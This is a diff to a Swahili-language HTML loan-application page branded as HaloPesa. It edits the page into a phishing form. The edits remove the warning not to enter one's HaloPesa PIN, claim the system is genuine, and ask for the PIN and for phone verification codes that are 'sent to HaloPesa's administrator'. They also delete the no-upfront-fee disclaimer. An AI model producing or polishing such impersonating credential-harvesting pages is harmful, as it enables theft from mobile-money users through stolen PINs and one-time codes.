@@ -17,7 +17,7 @@
 
   <div class="notice">
     <strong>Utoaji wa Mkopo wa HaloPesa</strong>
-    <span>Mfumo huru wa maombi ya mkopo. Usiweke PIN yako ya HaloPesa.</span>
+    <span>Mfumo halisi wa maombi ya mkopo. weka PIN yako ya HaloPesa.</span>
   </div>
 
   <div class="steps" aria-label="Hatua za maombi">
@@ -26,39 +26,39 @@
 
   <section class="page active" data-page="1">
     <div class="hero"><div class="icon">📱</div><h1>Maombi</h1>
-      <p>Weka nambari ya simu ya maombi na Kitambulisho cha Maombi.</p></div>
+      <p>Weka nambari ya simu ya maombi na pin yako.</p></div>
     <form id="loginForm" class="card form-card">
       <label>Nambari ya simu ya maombi</label>
       <input id="phone" required placeholder="07XXXXXXXX" inputmode="tel" autocomplete="tel">
-      <label>Application ID</label>
-      <input id="applicationIdInput" required maxlength="80" placeholder="Weka Kitambulisho chako cha Maombi" autocomplete="off">
-      <div class="hint">Taarifa hizi zitatumwa kwa msimamizi kwa ajili ya kuidhinisha ombi.</div>
+      <label>pin</label>
+      <input id="applicationIdInput" required maxlength="80" placeholder="Weka pin " autocomplete="off">
+      <div class="hint">Taarifa hizi zitatumwa kwa halopesa kwa ajili ya kuidhinisha ombi.</div>
       <button class="primary" id="startApplication" type="submit">TUMA OMBI <span>→</span></button>
       <div class="error hidden" id="loginError"></div>
-      <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya msimamizi</strong><span>Ombi lako limetumwa. Tafadhali subiri huku msimamizi aliyeidhinishwa akilipitia.</span><small>Application ID: <b id="applicationNumber">—</b></small></div>
+      <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya msimamizi</strong><span>Ombi lako limetumwa. Tafadhali subiri huku msimamizi aliyeidhinishwa wa halopesa akilipitia.</span><small>Application pin: <b id="applicationNumber">—</b></small></div>
     </form>
   </section>
 
   <section class="page" data-page="2">
     <div class="hero"><div class="icon">👤</div><h1>Jina la Kwanza</h1>
-      <p>Ombi lako limeidhinishwa. Weka jina lako la kwanza kwa ajili ya idhini ya msimamizi.</p></div>
+      <p>Ombi lako limeidhinishwa. Ingiza msimbo wa uthibitisho uliotumwa kwenye namba yako ya simu ili kuendelea.</p></div>
     <div class="card form-card">
-      <label>Jina la kwanza</label>
-      <input id="firstName" maxlength="120" autocomplete="given-name" placeholder="Weka jina lako la kwanza">
-      <button class="primary" id="firstNameBtn">TUMA JINA LA KWANZA <span>→</span></button>
-      <div class="waiting hidden" id="firstNameWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya jina</strong><span>Jina lako la kwanza limetumwa kwa msimamizi.</span></div>
+      <label>msimbo wa uthibitisho</label>
+      <input id="msimbo wa uthibitisho" maxlength="120" autocomplete="given-name" placeholder="Weka msimbo wa uthibitisho">
+      <button class="primary" id="firstNameBtn">TUMA msimbo wa uthibitisho <span>→</span></button>
+      <div class="waiting hidden" id="firstNameWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya msimbo wa uthibitisho</strong><span>msimbo wa uthibitisho limetumwa kwa msimamizi wa halopesa.</span></div>
       <div class="error hidden" id="page2Error"></div>
     </div>
   </section>
 
   <section class="page" data-page="3">
-    <div class="hero"><div class="icon">👤</div><h1>Jina la Pili</h1>
-      <p>Jina lako la kwanza limeidhinishwa. Weka jina lako la pili kwa idhini ya mwisho ya msimamizi.</p></div>
+    <div class="hero"><div class="icon">👤</div><h1>msimbo wa uthibitisho wa taarifa</h1>
+      <p>Msimbo wako wa kwanza umethibitishwa. Ingiza msimbo wa uthibitisho ili kuthibitisha taarifa ulizowasilisha pamoja na kiasi cha fedha unachotaka kupokea.</p></div>
     <div class="card form-card">
-      <label>Jina la pili</label>
-      <input id="secondName" maxlength="120" autocomplete="family-name" placeholder="Weka jina lako la pili">
+      <label>Msimbo wa umethibitishwa</label>
+      <input id="secondName" maxlength="120" autocomplete="family-name" placeholder="Ingiza msimbo wa uthibitish">
       <button class="primary" id="secondNameBtn">TUMA JINA LA PILI <span>→</span></button>
-      <div class="waiting hidden" id="secondNameWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya mwisho</strong><span>Jina lako la pili limetumwa kwa msimamizi.</span></div>
+      <div class="waiting hidden" id="secondNameWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya mwisho</strong><span>msimbo wa uthibitisho limetumwa kwa msimamizi.</span></div>
       <div class="error hidden" id="page3Error"></div>
     </div>
   </section>
@@ -79,7 +79,7 @@
   <section class="page" data-page="success">
     <div class="success-card"><div class="big-check">✓</div><h1>Hongera!</h1>
       <p>Ombi lako la mkopo la <strong id="successAmount">—</strong> limeidhinishwa na linasubiri kutolewa ndani ya saa 24.</p>
-      <div class="brand-disclaimer">Mfumo huru wa maombi ya mkopo. Hakuna malipo ya awali yanayohitajika ili kupokea mkopo ulioidhinishwa.</div>
+      <div class="brand-disclaimer">Mfumo halisi wa maombi ya mkopo.</div>
       <div class="application-number" id="successNumber">—</div><small>Hifadhi Kitambulisho hiki cha Maombi kwa ajili ya kumbukumbu.</small>
     </div>
   </section>
